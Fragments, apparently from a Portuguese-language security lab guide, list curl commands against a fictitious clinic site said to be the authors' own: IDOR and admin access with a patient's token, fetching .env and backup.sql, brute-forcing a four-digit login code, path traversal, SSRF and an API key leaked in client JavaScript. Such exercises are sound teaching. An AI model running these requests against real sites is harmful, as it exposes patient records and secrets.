...
> É a nossa própria clínica (fictícia). TODOS os ataques rodam em `https://clinica-vidaplena.vercel.app` (o site NO AR). Dados 100% fictícios.
...
```bash
curl "https://clinica-vidaplena.vercel.app/api/agendamentos/103?token=tok_mariana_4d1"
```
...
```bash
curl "https://clinica-vidaplena.vercel.app/.env"
```
...
```bash
curl "https://clinica-vidaplena.vercel.app/api/admin/pacientes?token=tok_mariana_4d1"
curl "https://clinica-vidaplena.vercel.app/api/admin/agenda?token=tok_mariana_4d1"
curl "https://clinica-vidaplena.vercel.app/api/admin/financeiro?token=tok_mariana_4d1"
```
...
```bash
curl -X POST "https://clinica-vidaplena.vercel.app/api/login/codigo" -H "Content-Type: application/json" -d '{"email":"mariana@exemplo.com","codigo":"0000"}'
# ...tentativas ilimitadas... até acertar:
curl -X POST "https://clinica-vidaplena.vercel.app/api/login/codigo" -H "Content-Type: application/json" -d '{"email":"mariana@exemplo.com","codigo":"4815"}'
```
...
```bash
curl "https://clinica-vidaplena.vercel.app/api/exame?arquivo=../../.env"
```
...
```bash
curl -X POST "https://clinica-vidaplena.vercel.app/api/importar-foto" -H "Content-Type: application/json" -d '{"url":"https://clinica-vidaplena.vercel.app/.env"}'
```
...
```bash
curl "https://clinica-vidaplena.vercel.app/app.js" | grep VIDA_AI_KEY
```
...
```bash
curl "https://clinica-vidaplena.vercel.app/backup.sql"       # dump com todos os dados e senhas
curl -sI "https://clinica-vidaplena.vercel.app/" | head -8   # servidor se entregando (X-Powered-By, zero headers)
```
